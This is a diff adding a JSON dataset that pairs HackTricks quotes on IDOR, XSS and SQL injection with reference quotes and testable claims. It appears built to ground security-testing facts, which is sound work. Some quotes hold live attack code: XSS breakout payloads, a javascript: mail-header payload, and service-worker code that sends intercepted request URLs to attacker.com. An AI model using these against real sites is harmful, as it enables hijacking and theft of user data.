@@ -1,0 +1,996 @@
+[
+ {
+  "class_id": "idor",
+  "kind": "test",
+  "hacktricks_url": "https://raw.githubusercontent.com/HackTricks-wiki/hacktricks/master/src/generic-methodologies-and-resources/pentesting-wifi/wifi-direct-and-iot-provisioning.md",
+  "hacktricks_page": "generic-methodologies-and-resources/pentesting-wifi/wifi-direct-and-iot-provisioning.md",
+  "page_title": "Wi-Fi Direct, Aware, AWDL and IoT Provisioning",
+  "QUOTE_VERBATIM": "Validate IDOR/BOLA only with two accounts/devices you control; a serial number is not proof of ownership.",
+  "class_terms_in_quote": [
+   "bola",
+   "idor"
+  ],
+  "class_vocabulary": [
+   "bola",
+   "horizontal privilege",
+   "idor",
+   "insecure direct object reference",
+   "object id",
+   "ownership check",
+   "sequential id",
+   "uuid"
+  ],
+  "partner_url": "https://portswigger.net/web-security/access-control",
+  "partner_org": "portswigger.net",
+  "partner_quote_already_verified": "If an attacker can use the `GET` (or another) method to perform actions on a restricted URL, they can bypass the access control that is implemented at the platform layer.",
+  "claim": "An IDOR/BOLA finding is only validated with two identities the tester controls, because a hardware serial number seen on the device proves nothing about the server-side ownership check on the object id.",
+  "disproof": "A validation run in which the second identity is not under the tester's control, or in which access is judged from a device serial number instead of a cross-account request against the object id, refutes this requirement."
+ },
+ {
+  "class_id": "idor",
+  "kind": "prerequisite",
+  "hacktricks_url": "https://raw.githubusercontent.com/HackTricks-wiki/hacktricks/master/src/pentesting-web/idor.md",
+  "hacktricks_page": "pentesting-web/idor.md",
+  "page_title": "IDOR",
+  "QUOTE_VERBATIM": "IDOR (Insecure Direct Object Reference)\n\n{{#include ../banners/hacktricks-training.md}}\n\nIDOR (Insecure Direct Object Reference) / Broken Object Level Authorization (BOLA) appears when a web or API endpoint discloses or accepts a user–controllable identifier that is used directly to access an internal object without verifying that the caller is authorized to access/modify that object.",
+  "class_terms_in_quote": [
+   "insecure direct object reference"
+  ],
+  "class_vocabulary": [
+   "bola",
+   "horizontal privilege",
+   "idor",
+   "insecure direct object reference",
+   "object id",
+   "ownership check",
+   "sequential id",
+   "uuid"
+  ],
+  "partner_url": "https://portswigger.net/web-security/access-control/idor",
+  "partner_org": "portswigger.net",
+  "partner_quote_already_verified": "Insecure direct object references (IDOR) are a type of access control vulnerability that arises when an application uses user-supplied input to access objects directly.",
+  "claim": "IDOR/BOLA needs two things at once: an endpoint that accepts a user-controllable object id, and the absence of any check that the caller may access or modify the object that id resolves to.",
+  "disproof": "An endpoint that accepts an attacker-supplied object id but still refuses cross-account access with 403 or 404 because it verifies the caller's ownership refutes the missing-authorization half of the claim."
+ },
+ {
+  "class_id": "idor",
+  "kind": "technique",
+  "hacktricks_url": "https://raw.githubusercontent.com/HackTricks-wiki/hacktricks/master/src/pentesting-web/idor.md",
+  "hacktricks_page": "pentesting-web/idor.md",
+  "page_title": "IDOR",
+  "QUOTE_VERBATIM": "Real-World Case Study – McHire Chatbot Platform (2025)\n\nDuring an assessment of the Paradox.ai-powered McHire recruitment portal the following IDOR was discovered:\n\n* Endpoint:",
+  "class_terms_in_quote": [
+   "idor"
+  ],
+  "class_vocabulary": [
+   "bola",
+   "horizontal privilege",
+   "idor",
+   "insecure direct object reference",
+   "object id",
+   "ownership check",
+   "sequential id",
+   "uuid"
+  ],
+  "partner_url": "https://portswigger.net/web-security/access-control/idor",
+  "partner_org": "portswigger.net",
+  "partner_quote_already_verified": "Insecure direct object references (IDOR) are a type of access control vulnerability that arises when an application uses user-supplied input to access objects directly.",
+  "claim": null,
+  "disproof": null,
+  "reject_reason": "Truncated case-study heading: the quote stops at '* Endpoint:' and contains no endpoint, object id, response or testing step, so it grounds no hunting or testing fact beyond naming a target product."
+ },
+ {
+  "class_id": "idor",
+  "kind": "technique",
+  "hacktricks_url": "https://raw.githubusercontent.com/HackTricks-wiki/hacktricks/master/src/pentesting-web/idor.md",
+  "hacktricks_page": "pentesting-web/idor.md",
+  "page_title": "IDOR",
+  "QUOTE_VERBATIM": "Auth Matrix, Forced Browse. \n* Github projects: bwapp-idor-scanner, Blindy (bulk IDOR hunting).",
+  "class_terms_in_quote": [
+   "idor"
+  ],
+  "class_vocabulary": [
+   "bola",
+   "horizontal privilege",
+   "idor",
+   "insecure direct object reference",
+   "object id",
+   "ownership check",
+   "sequential id",
+   "uuid"
+  ],
+  "partner_url": "https://portswigger.net/web-security/access-control/idor",
+  "partner_org": "portswigger.net",
+  "partner_quote_already_verified": "Insecure direct object references (IDOR) are a type of access control vulnerability that arises when an application uses user-supplied input to access objects directly.",
+  "claim": "IDOR coverage comes from pairing a forced-browse / auth-matrix pass that maps which roles may reach each endpoint with bulk sweeps of collected object ids, rather than probing one identifier at a time by hand.",
+  "disproof": "A hunt that only issues single-id probes, or that never maps roles to endpoints, refutes this pairing as the thing that actually produces IDOR coverage."
+ },
+ {
+  "class_id": "xss",
+  "kind": "prerequisite",
+  "hacktricks_url": "https://raw.githubusercontent.com/HackTricks-wiki/hacktricks/master/src/pentesting-web/browser-extension-pentesting-methodology/browext-xss-example.md",
+  "hacktricks_page": "pentesting-web/browser-extension-pentesting-methodology/browext-xss-example.md",
+  "page_title": "BrowExt - XSS Example",
+  "QUOTE_VERBATIM": "\"script-src 'self' 'unsafe-eval'; object-src 'self';\"\n\n\nHowever, 'unsafe-eval' does not authorize inline event handlers such as this payload's onerror; that requires 'unsafe-inline', a matching hash/nonce mechanism where applicable, or another executable gadget.",
+  "class_terms_in_quote": [
+   "event handler",
+   "payload",
+   "script"
+  ],
+  "class_vocabulary": [
+   "browser",
+   "cross-site scripting",
+   "dom",
+   "event handler",
+   "html",
+   "innerhtml",
+   "javascript",
+   "payload",
+   "reflected",
+   "script",
+   "sink",
+   "stored xss",
+   "xss"
+  ],
+  "partner_url": "https://portswigger.net/web-security/cross-site-scripting/contexts",
+  "partner_org": "portswigger.net",
+  "partner_quote_already_verified": "More commonly in this situation, angle brackets are blocked or encoded, so your input cannot break out of the tag in which it appears. Provided you can terminate the attribute value, you can normally introduce a new attribute that creates a scriptable context, such as an event handler. For example: \" autofocus onfocus=alert(document.domain) x=\" The above payload creates an onfocus event that will execute JavaScript when the element receives the focus, and also adds the autofocus attribute to try to trigger the onfocus event automatically without any user interaction. Finally, it adds x=\" to",
+  "claim": "An onerror-style inline event handler payload only runs when script-src actually permits inline execution, so the extension CSP has to be read before the payload is called exploitable — 'unsafe-eval' in the policy buys the tester nothing here.",
+  "disproof": "An inline event handler payload firing on a page whose script-src carries only 'unsafe-eval', with no 'unsafe-inline', no matching hash or nonce, and no other executable gadget, refutes this gating."
+ },
+ {
+  "class_id": "xss",
+  "kind": "technique",
+  "hacktricks_url": "https://raw.githubusercontent.com/HackTricks-wiki/hacktricks/master/src/pentesting-web/browser-extension-pentesting-methodology/browext-xss-example.md",
+  "hacktricks_page": "pentesting-web/browser-extension-pentesting-methodology/browext-xss-example.md",
+  "page_title": "BrowExt - XSS Example",
+  "QUOTE_VERBATIM": "Classify the final execution context before assessing impact:<sup>[[8]](#references)[[9]](#references)</sup>\n Context | What successful injection normally gains | What to verify |\n Host-page DOM modified by a content script | JavaScript in the web page's main world, not automatic access to the content script's isolated-world privileges | Page CSP and whether a DOM or window.postMessage bridge forwards attacker data to the content script |\n Ordinary extension page (popup, options page, or reachable extension HTML) | The extension origin and the extension APIs available to that page | The extension-page CSP, manifest permissions, and any runtime-message handlers reachable from the page |\n Manifest V2 background page | A privileged extension page with a DOM | Whether attacker data reaches an HTML/code-execution sink through messaging or stored state |\n Manifest V3 service worker | No DOM, so this is a message/API or code-injection review rather than DOM XSS | Untrusted messages, unsafe URL/API arguments, and dynamic-code sinks |\n Page listed in sandbox.pages | Script allowed by the sandbox's separate CSP, but in a unique origin without extension APIs or direct access to non-sandboxed pages | Whether a privileged parent trusts messages from the sandbox and exposes an unsafe postMessage bridge |\n\nThe sandbox case is an important exception to the usual MV3 CSP rule.",
+  "class_terms_in_quote": [
+   "javascript",
+   "script"
+  ],
+  "class_vocabulary": [
+   "browser",
+   "cross-site scripting",
+   "dom",
+   "event handler",
+   "html",
+   "innerhtml",
+   "javascript",
+   "payload",
+   "reflected",
+   "script",
+   "sink",
+   "stored xss",
+   "xss"
+  ],
+  "partner_url": "https://portswigger.net/web-security/cross-site-scripting/contexts",
+  "partner_org": "portswigger.net",
+  "partner_quote_already_verified": "More commonly in this situation, angle brackets are blocked or encoded, so your input cannot break out of the tag in which it appears. Provided you can terminate the attribute value, you can normally introduce a new attribute that creates a scriptable context, such as an event handler. For example: \" autofocus onfocus=alert(document.domain) x=\" The above payload creates an onfocus event that will execute JavaScript when the element receives the focus, and also adds the autofocus attribute to try to trigger the onfocus event automatically without any user interaction. Finally, it adds x=\" to",
+  "claim": "The same injection in an extension is triaged by where it lands, not by whether it 'works': script in a Manifest V3 service worker is a message/API and code-injection review because there is no DOM to modify, while a sandboxed page is the documented exception to the usual MV3 CSP rule.",
+  "disproof": "A payload that reaches a DOM sink and executes as page JavaScript from a Manifest V3 service worker, or a sandboxed page that inherits the host extension's CSP and APIs, refutes this context-based split."
+ },
+ {
+  "class_id": "xss",
+  "kind": "signal",
+  "hacktricks_url": "https://raw.githubusercontent.com/HackTricks-wiki/hacktricks/master/src/pentesting-web/browser-extension-pentesting-methodology/browext-xss-example.md",
+  "hacktricks_page": "pentesting-web/browser-extension-pentesting-methodology/browext-xss-example.md",
+  "page_title": "BrowExt - XSS Example",
+  "QUOTE_VERBATIM": "The problematic JavaScript, part of bookmarks.js, is detailed below:\n\njavascript\n$(\"#btAdd\").on(\"click\", function () {\n var bookmarkName = $(\"#txtName\").val()\n if (\n $(\".custom-button .label\").filter(function () {\n return $(this).text() === bookmarkName\n }).length\n )\n return false\n\n var bookmarkItem = $('<div class=\"custom-button\">')\n bookmarkItem.html('<span class=\"label\">' + bookmarkName + \"</span>\")\n bookmarkItem.append('<button class=\"remove-btn\" title=\"delete\">x</button>')\n bookmarkItem.attr(\"data-title\", bookmarkName)\n bookmarkItem.data(\"timestamp\", new Date().getTime())\n $(\"section.bookmark-container .existing-items\").append(bookmarkItem)\n persistData()\n})\n\n\nThis snippet fetches the value from the txtName input field and uses string concatenation to generate HTML, which is then appended to the DOM using jQuery’s .append() function.<sup>[[2]](#references)</sup>\n\nChrome's extension CSP normally prevents inline script and eval-like execution.",
+  "class_terms_in_quote": [
+   "javascript",
+   "script"
+  ],
+  "class_vocabulary": [
+   "browser",
+   "cross-site scripting",
+   "dom",
+   "event handler",
+   "html",
+   "innerhtml",
+   "javascript",
+   "payload",
+   "reflected",
+   "script",
+   "sink",
+   "stored xss",
+   "xss"
+  ],
+  "partner_url": "https://portswigger.net/web-security/cross-site-scripting/contexts",
+  "partner_org": "portswigger.net",
+  "partner_quote_already_verified": "More commonly in this situation, angle brackets are blocked or encoded, so your input cannot break out of the tag in which it appears. Provided you can terminate the attribute value, you can normally introduce a new attribute that creates a scriptable context, such as an event handler. For example: \" autofocus onfocus=alert(document.domain) x=\" The above payload creates an onfocus event that will execute JavaScript when the element receives the focus, and also adds the autofocus attribute to try to trigger the onfocus event automatically without any user interaction. Finally, it adds x=\" to",
+  "claim": "The XSS sink to hunt for in extension code is the pattern of reading a value out of an input, concatenating it into an HTML string and appending the result to the DOM, because that route is open even where the extension CSP blocks eval-like and inline script execution.",
+  "disproof": "A concatenating handler whose value is escaped or inserted as text before the append, so the same input renders as literal characters with no new element or handler, refutes this sink pattern."
+ },
+ {
+  "class_id": "xss",
+  "kind": "signal",
+  "hacktricks_url": "https://raw.githubusercontent.com/HackTricks-wiki/hacktricks/master/src/pentesting-web/xss-cross-site-scripting/README.md",
+  "hacktricks_page": "pentesting-web/xss-cross-site-scripting/README.md",
+  "page_title": "XSS (Cross Site Scripting)",
+  "QUOTE_VERBATIM": "This is not trivial as modern browsers do not interpret the HTTP response body if the HTTP response status code is a 302, so just a cross-site scripting payload is useless.",
+  "class_terms_in_quote": [
+   "browser",
+   "cross-site scripting",
+   "payload",
+   "script"
+  ],
+  "class_vocabulary": [
+   "browser",
+   "cross-site scripting",
+   "dom",
+   "event handler",
+   "html",
+   "innerhtml",
+   "javascript",
+   "payload",
+   "reflected",
+   "script",
+   "sink",
+   "stored xss",
+   "xss"
+  ],
+  "partner_url": "https://portswigger.net/web-security/cross-site-scripting/content-security-policy",
+  "partner_org": "portswigger.net",
+  "partner_quote_already_verified": "The CSP directive can specify a nonce (a random value) and the same value must be used in the tag that loads a script. If the values do not match, then the script will not execute. To be effective as a control, the nonce must be securely generated on each page load and not be guessable by an attacker. The CSP directive can specify a hash of the contents of the trusted script. If the hash of the actual script does not match the value specified in the directive, then the script will not execute. If the content of the script ever changes, then you will of course need to update the hash value",
+  "claim": "Reflection alone is not a cross-site scripting finding when the reflected payload sits in the body of a 302: the browser never renders that body, so the injection only counts once it lands somewhere the browser actually parses.",
+  "disproof": "Script executing from a payload delivered only in the body of a 302 response, in a browser that follows the redirect before parsing, refutes this claim."
+ },
+ {
+  "class_id": "xss",
+  "kind": "technique",
+  "hacktricks_url": "https://raw.githubusercontent.com/HackTricks-wiki/hacktricks/master/src/pentesting-web/xss-cross-site-scripting/README.md",
+  "hacktricks_page": "pentesting-web/xss-cross-site-scripting/README.md",
+  "page_title": "XSS (Cross Site Scripting)",
+  "QUOTE_VERBATIM": "Escaping \\<script> tag\n\nIf your code is inserted within <script> [...] var input = 'reflected data' [...] </script> you could easily escape closing the <script> tag:\n\njavascript\n</script><img src=1 onerror=alert(document.domain)>\n\n\nNote that in this example we haven't even closed the single quote.",
+  "class_terms_in_quote": [
+   "javascript",
+   "reflected",
+   "script"
+  ],
+  "class_vocabulary": [
+   "browser",
+   "cross-site scripting",
+   "dom",
+   "event handler",
+   "html",
+   "innerhtml",
+   "javascript",
+   "payload",
+   "reflected",
+   "script",
+   "sink",
+   "stored xss",
+   "xss"
+  ],
+  "partner_url": "https://portswigger.net/web-security/cross-site-scripting/content-security-policy",
+  "partner_org": "portswigger.net",
+  "partner_quote_already_verified": "The CSP directive can specify a nonce (a random value) and the same value must be used in the tag that loads a script. If the values do not match, then the script will not execute. To be effective as a control, the nonce must be securely generated on each page load and not be guessable by an attacker. The CSP directive can specify a hash of the contents of the trusted script. If the hash of the actual script does not match the value specified in the directive, then the script will not execute. If the content of the script ever changes, then you will of course need to update the hash value",
+  "claim": "When reflected data is placed inside a script block, terminating the script element is enough to get an event handler out of it, so escaping single quotes in that context buys nothing and the tester should probe the script context rather than the quoted string.",
+  "disproof": "A reflected value containing a closing script tag sequence that neither terminates the block nor produces any new element or handler in the rendered page refutes the escapability."
+ },
+ {
+  "class_id": "xss",
+  "kind": "variant",
+  "hacktricks_url": "https://raw.githubusercontent.com/HackTricks-wiki/hacktricks/master/src/pentesting-web/xss-cross-site-scripting/README.md",
+  "hacktricks_page": "pentesting-web/xss-cross-site-scripting/README.md",
+  "page_title": "XSS (Cross Site Scripting)",
+  "QUOTE_VERBATIM": "Observe the stored-XSS primitive: the payload persists with the email and only requires a click to execute.\n\ntext\nList-Unsubscribe: <javascript://attacker.tld/%0aconfirm(document.domain)>\nList-Unsubscribe-Post:",
+  "class_terms_in_quote": [
+   "javascript",
+   "payload",
+   "stored xss"
+  ],
+  "class_vocabulary": [
+   "browser",
+   "cross-site scripting",
+   "dom",
+   "event handler",
+   "html",
+   "innerhtml",
+   "javascript",
+   "payload",
+   "reflected",
+   "script",
+   "sink",
+   "stored xss",
+   "xss"
+  ],
+  "partner_url": "https://portswigger.net/web-security/cross-site-scripting/content-security-policy",
+  "partner_org": "portswigger.net",
+  "partner_quote_already_verified": "The CSP directive can specify a nonce (a random value) and the same value must be used in the tag that loads a script. If the values do not match, then the script will not execute. To be effective as a control, the nonce must be securely generated on each page load and not be guessable by an attacker. The CSP directive can specify a hash of the contents of the trusted script. If the hash of the actual script does not match the value specified in the directive, then the script will not execute. If the content of the script ever changes, then you will of course need to update the hash value",
+  "claim": "A stored-XSS sink can sit in a message header rather than a web request: the payload is stored alongside the message and later rendered by the mail client, where one click is enough to run it, so mail-rendering paths deserve the same stored-XSS attention as web pages.",
+  "disproof": "A stored message whose header payload the client never renders, or which needs more than the single user click to execute, refutes this stored-XSS primitive."
+ },
+ {
+  "class_id": "xss",
+  "kind": "impact",
+  "hacktricks_url": "https://raw.githubusercontent.com/HackTricks-wiki/hacktricks/master/src/pentesting-web/xss-cross-site-scripting/abusing-service-workers.md",
+  "hacktricks_page": "pentesting-web/xss-cross-site-scripting/abusing-service-workers.md",
+  "page_title": "Abusing Service Workers",
+  "QUOTE_VERBATIM": "For example:\n\njavascript\nvar sw =\n \"/jsonp?callback=onfetch=function(e){ e.respondWith(caches.match(e.request).then(function(response){ fetch('https://attacker.com/fetch_url/' + e.request.url) }) )}//\"\n\n\nShadow Workers is a command-and-control framework dedicated to service-worker exploitation.<sup>[[4]](#references)</sup>\n\nService-worker update checks bypass the browser cache when the previous fetch occurred more than 24 hours ago, but that does not guarantee that a malicious worker disappears within 24 hours: the old worker can remain active until a changed script is fetched, installed, and activated.",
+  "class_terms_in_quote": [
+   "browser",
+   "javascript",
+   "script"
+  ],
+  "class_vocabulary": [
+   "browser",
+   "cross-site scripting",
+   "dom",
+   "event handler",
+   "html",
+   "innerhtml",
+   "javascript",
+   "payload",
+   "reflected",
+   "script",
+   "sink",
+   "stored xss",
+   "xss"
+  ],
+  "partner_url": "https://portswigger.net/web-security/cross-site-scripting/dom-based",
+  "partner_org": "portswigger.net",
+  "partner_quote_already_verified": "DOM-based XSS vulnerabilities usually arise when JavaScript takes data from an attacker-controllable source, such as the URL, and passes it to a sink that supports dynamic code execution, such as eval() or innerHTML . This enables attackers to execute malicious JavaScript, which typically allows them to hijack other users' accounts. To deliver a DOM-based XSS attack, you need to place data into a source so that it is propagated to a sink and causes execution of arbitrary JavaScript. The most common source for DOM XSS is the URL, which is typically accessed with the window.location object",
+  "claim": "An XSS-installed service worker outlives the 24-hour window that makes the browser bypass its cache on update checks, so a remediation claim of 'fixed within a day' is not supported until a changed script has actually been fetched, installed and activated.",
+  "disproof": "A malicious worker that stops intercepting requests within 24 hours of the site serving a changed script refutes the persistence claim."
+ },
+ {
+  "class_id": "xss",
+  "kind": "prerequisite",
+  "hacktricks_url": "https://raw.githubusercontent.com/HackTricks-wiki/hacktricks/master/src/pentesting-web/xss-cross-site-scripting/abusing-service-workers.md",
+  "hacktricks_page": "pentesting-web/xss-cross-site-scripting/abusing-service-workers.md",
+  "page_title": "Abusing Service Workers",
+  "QUOTE_VERBATIM": "Attack Creating a Service Worker\n\nIn order to exploit this vulnerability you need to find:\n\n- A way to upload arbitrary JS files to the server and a XSS to load the service worker of the uploaded JS file\n- A vulnerable JSONP request where you can manipulate the output (with arbitrary JS code) and a XSS to load the JSONP with a payload that will load a malicious service worker.",
+  "class_terms_in_quote": [
+   "payload"
+  ],
+  "class_vocabulary": [
+   "browser",
+   "cross-site scripting",
+   "dom",
+   "event handler",
+   "html",
+   "innerhtml",
+   "javascript",
+   "payload",
+   "reflected",
+   "script",
+   "sink",
+   "stored xss",
+   "xss"
+  ],
+  "partner_url": "https://portswigger.net/web-security/cross-site-scripting/dom-based",
+  "partner_org": "portswigger.net",
+  "partner_quote_already_verified": "DOM-based XSS vulnerabilities usually arise when JavaScript takes data from an attacker-controllable source, such as the URL, and passes it to a sink that supports dynamic code execution, such as eval() or innerHTML . This enables attackers to execute malicious JavaScript, which typically allows them to hijack other users' accounts. To deliver a DOM-based XSS attack, you need to place data into a source so that it is propagated to a sink and causes execution of arbitrary JavaScript. The most common source for DOM XSS is the URL, which is typically accessed with the window.location object",
+  "claim": "Service-worker XSS is only reachable when two prerequisites line up: a place to serve attacker JavaScript from the target origin, either a file upload or a JSONP endpoint whose output can be filled with arbitrary JS, plus an XSS that can load and register that script as the worker.",
+  "disproof": "Registering and controlling a worker script on the origin with neither arbitrary-JS hosting nor a JSONP endpoint that can be made to emit arbitrary JS refutes these as the required prerequisites."
+ },
+ {
+  "class_id": "xss",
+  "kind": "prerequisite",
+  "hacktricks_url": "https://raw.githubusercontent.com/HackTricks-wiki/hacktricks/master/src/pentesting-web/xss-cross-site-scripting/abusing-service-workers.md",
+  "hacktricks_page": "pentesting-web/xss-cross-site-scripting/abusing-service-workers.md",
+  "page_title": "Abusing Service Workers",
+  "QUOTE_VERBATIM": "This is the code that must be uploaded to the vulnerable origin or returned through a vulnerable JSONP endpoint:\n\njavascript\nself.addEventListener(\"fetch\", (event) => {\n event.waitUntil(\n fetch(\"https://attacker.com/fetch_url/\" + encodeURIComponent(event.request.url), {\n mode:",
+  "class_terms_in_quote": [
+   "javascript"
+  ],
+  "class_vocabulary": [
+   "browser",
+   "cross-site scripting",
+   "dom",
+   "event handler",
+   "html",
+   "innerhtml",
+   "javascript",
+   "payload",
+   "reflected",
+   "script",
+   "sink",
+   "stored xss",
+   "xss"
+  ],
+  "partner_url": "https://portswigger.net/web-security/cross-site-scripting/dom-based",
+  "partner_org": "portswigger.net",
+  "partner_quote_already_verified": "DOM-based XSS vulnerabilities usually arise when JavaScript takes data from an attacker-controllable source, such as the URL, and passes it to a sink that supports dynamic code execution, such as eval() or innerHTML . This enables attackers to execute malicious JavaScript, which typically allows them to hijack other users' accounts. To deliver a DOM-based XSS attack, you need to place data into a source so that it is propagated to a sink and causes execution of arbitrary JavaScript. The most common source for DOM XSS is the URL, which is typically accessed with the window.location object",
+  "claim": "The worker body is the delivery half of the chain: a fetch-event listener that forwards every intercepted request URL off-origin only runs if that script is served from the vulnerable origin, so both the upload path and the JSONP path are worth probing for a real XSS.",
+  "disproof": "A fetch-listener worker registered and intercepting traffic from a script hosted off the vulnerable origin, or a JSONP response whose callback cannot be broken out of, refutes the origin-delivery requirement."
+ },
+ {
+  "class_id": "xss",
+  "kind": "technique",
+  "hacktricks_url": "https://raw.githubusercontent.com/HackTricks-wiki/hacktricks/master/src/pentesting-web/xss-cross-site-scripting/chrome-cache-to-xss.md",
+  "hacktricks_page": "pentesting-web/xss-cross-site-scripting/chrome-cache-to-xss.md",
+  "page_title": "Chrome Cache to XSS",
+  "QUOTE_VERBATIM": "Chrome Cache to XSS\n\n{{#include ../../banners/hacktricks-training.md}}\n\nThis is a browser-local cache abuse technique in Chrome: you first make the victim cache attacker-influenced content in their own browser, and later force a history navigation that restores the bytes from disk cache in a more dangerous context.",
+  "class_terms_in_quote": [
+   "browser"
+  ],
+  "class_vocabulary": [
+   "browser",
+   "cross-site scripting",
+   "dom",
+   "event handler",
+   "html",
+   "innerhtml",
+   "javascript",
+   "payload",
+   "reflected",
+   "script",
+   "sink",
+   "stored xss",
+   "xss"
+  ],
+  "partner_url": "https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html",
+  "partner_org": "owasp.org",
+  "partner_quote_already_verified": "For JSON, verify that the Content-Type header is application/json and not text/html to prevent XSS. Output Encoding for “CSS Contexts” ¶ “CSS Contexts” refer to variables placed into inline CSS, which is common when developers want their users to customize the look and feel of their webpages. Since CSS is surprisingly powerful, it has been used for many types of attacks. Variables should only be placed in a CSS property value. Other “CSS Contexts” are unsafe and you should not place variable data in them. style > selector { property : $ varUnsafe ; } style > style > selector { property",
+  "claim": "Cache-based XSS is a browser-local abuse with two beats: the attacker-influenced bytes must first be sitting in the victim's own cache, and the payload only lands on a second, history-driven navigation that re-serves them in a more dangerous context.",
+  "disproof": "A payload that executes on the initial request with nothing cached beforehand, or that never needs a history navigation to fire, refutes the two-step cache-then-navigate structure."
+ },
+ {
+  "class_id": "xss",
+  "kind": "signal",
+  "hacktricks_url": "https://raw.githubusercontent.com/HackTricks-wiki/hacktricks/master/src/pentesting-web/xss-cross-site-scripting/chrome-cache-to-xss.md",
+  "hacktricks_page": "pentesting-web/xss-cross-site-scripting/chrome-cache-to-xss.md",
+  "page_title": "Chrome Cache to XSS",
+  "QUOTE_VERBATIM": "The original SECCON challenge writeup explains the chain in depth.<sup>[[1]](#references)</sup>\n\nThe technique revolves around the interaction of two cache types:\n\n- The back/forward cache (bfcache) stores a full page snapshot, including DOM and JavaScript heap.\n- The disk cache stores fetched responses/resources, but not the JavaScript heap.",
+  "class_terms_in_quote": [
+   "javascript"
+  ],
+  "class_vocabulary": [
+   "browser",
+   "cross-site scripting",
+   "dom",
+   "event handler",
+   "html",
+   "innerhtml",
+   "javascript",
+   "payload",
+   "reflected",
+   "script",
+   "sink",
+   "stored xss",
+   "xss"
+  ],
+  "partner_url": "https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html",
+  "partner_org": "owasp.org",
+  "partner_quote_already_verified": "For JSON, verify that the Content-Type header is application/json and not text/html to prevent XSS. Output Encoding for “CSS Contexts” ¶ “CSS Contexts” refer to variables placed into inline CSS, which is common when developers want their users to customize the look and feel of their webpages. Since CSS is surprisingly powerful, it has been used for many types of attacks. Variables should only be placed in a CSS property value. Other “CSS Contexts” are unsafe and you should not place variable data in them. style > selector { property : $ varUnsafe ; } style > style > selector { property",
+  "claim": "Which cache answers the navigation decides the execution context of the same bytes: a bfcache restore hands back the live DOM and JavaScript heap, while a disk-cache restore replays only the response, so a disk-cache hit is the state to look for when a script stops behaving as the tester expects.",
+  "disproof": "A bfcache restore that comes back without the page's JavaScript heap, or a disk-cache restore that revives the previous DOM and heap, refutes this two-cache distinction."
+ },
+ {
+  "class_id": "xss",
+  "kind": "signal",
+  "hacktricks_url": "https://raw.githubusercontent.com/HackTricks-wiki/hacktricks/master/src/pentesting-web/xss-cross-site-scripting/chrome-cache-to-xss.md",
+  "hacktricks_page": "pentesting-web/xss-cross-site-scripting/chrome-cache-to-xss.md",
+  "page_title": "Chrome Cache to XSS",
+  "QUOTE_VERBATIM": "Chrome has changed bfcache eligibility and HTTP cache keying over time, so old CTF/browser-bug tricks can be version-sensitive.",
+  "class_terms_in_quote": [
+   "browser"
+  ],
+  "class_vocabulary": [
+   "browser",
+   "cross-site scripting",
+   "dom",
+   "event handler",
+   "html",
+   "innerhtml",
+   "javascript",
+   "payload",
+   "reflected",
+   "script",
+   "sink",
+   "stored xss",
+   "xss"
+  ],
+  "partner_url": "https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html",
+  "partner_org": "owasp.org",
+  "partner_quote_already_verified": "For JSON, verify that the Content-Type header is application/json and not text/html to prevent XSS. Output Encoding for “CSS Contexts” ¶ “CSS Contexts” refer to variables placed into inline CSS, which is common when developers want their users to customize the look and feel of their webpages. Since CSS is surprisingly powerful, it has been used for many types of attacks. Variables should only be placed in a CSS property value. Other “CSS Contexts” are unsafe and you should not place variable data in them. style > selector { property : $ varUnsafe ; } style > style > selector { property",
+  "claim": "A published cache-to-XSS bypass cannot be replayed on trust: results have to be pinned to a browser build, because bfcache eligibility and HTTP cache keying have shifted and a documented chain may simply not reproduce on the version in hand.",
+  "disproof": "An old published chain reproducing unchanged across builds with different bfcache eligibility and cache-keying behaviour, and failing only for unrelated reasons, refutes the version sensitivity."
+ },
+ {
+  "class_id": "sqli",
+  "kind": "technique",
+  "hacktricks_url": "https://raw.githubusercontent.com/HackTricks-wiki/hacktricks/master/src/pentesting-web/sql-injection/README.md",
+  "hacktricks_page": "pentesting-web/sql-injection/README.md",
+  "page_title": "SQL Injection",
+  "QUOTE_VERBATIM": "An SQL injection is a security flaw that allows attackers to interfere with an application's database queries.",
+  "class_terms_in_quote": [
+   "database",
+   "sql injection"
+  ],
+  "class_vocabulary": [
+   " where ",
+   "boolean-based",
+   "code injection",
+   "database",
+   "dbms",
+   "orm",
+   "select ",
+   "sql",
+   "sql injection",
+   "sql query",
+   "time-based",
+   "union select"
+  ],
+  "partner_url": "https://cwe.mitre.org/data/definitions/89.html",
+  "partner_org": "mitre.org",
+  "partner_quote_already_verified": "For example, consider using persistence layers such as Hibernate or Enterprise Java Beans, which can provide significant protection against SQL injection if used properly.",
+  "claim": null,
+  "disproof": null,
+  "reject_reason": "The quote is only a one-sentence definition of the class and names no input, database behaviour, observable or technique, so any claim built on it would restate the class name rather than ground a hunting or testing fact."
+ },
+ {
+  "class_id": "sqli",
+  "kind": "test",
+  "hacktricks_url": "https://raw.githubusercontent.com/HackTricks-wiki/hacktricks/master/src/pentesting-web/sql-injection/README.md",
+  "hacktricks_page": "pentesting-web/sql-injection/README.md",
+  "page_title": "SQL Injection",
+  "QUOTE_VERBATIM": "Therefore, a good way to discover blind SQL injections is making the DB perform actions and will have an impact on the time the page need to load.\\\nTherefore, the we are going to concat in the SQL query an operation that will take a lot of time to complete:",
+  "class_terms_in_quote": [
+   "sql injection",
+   "sql query"
+  ],
+  "class_vocabulary": [
+   " where ",
+   "boolean-based",
+   "code injection",
+   "database",
+   "dbms",
+   "orm",
+   "select ",
+   "sql",
+   "sql injection",
+   "sql query",
+   "time-based",
+   "union select"
+  ],
+  "partner_url": "https://cwe.mitre.org/data/definitions/89.html",
+  "partner_org": "mitre.org",
+  "partner_quote_already_verified": "For example, consider using persistence layers such as Hibernate or Enterprise Java Beans, which can provide significant protection against SQL injection if used properly.",
+  "claim": "When a blind SQL injection returns no data, the proof is made of timing: concatenate a deliberately slow operation into the SQL query and look for a repeatable jump in page-load time that the unmodified request does not show.",
+  "disproof": "A concatenated slow operation that leaves page-load time flat, or a delay that appears just as often on a control request carrying no injected syntax, refutes it as a blind SQL injection oracle."
+ },
+ {
+  "class_id": "sqli",
+  "kind": "technique",
+  "hacktricks_url": "https://raw.githubusercontent.com/HackTricks-wiki/hacktricks/master/src/pentesting-web/sql-injection/README.md",
+  "hacktricks_page": "pentesting-web/sql-injection/README.md",
+  "page_title": "SQL Injection",
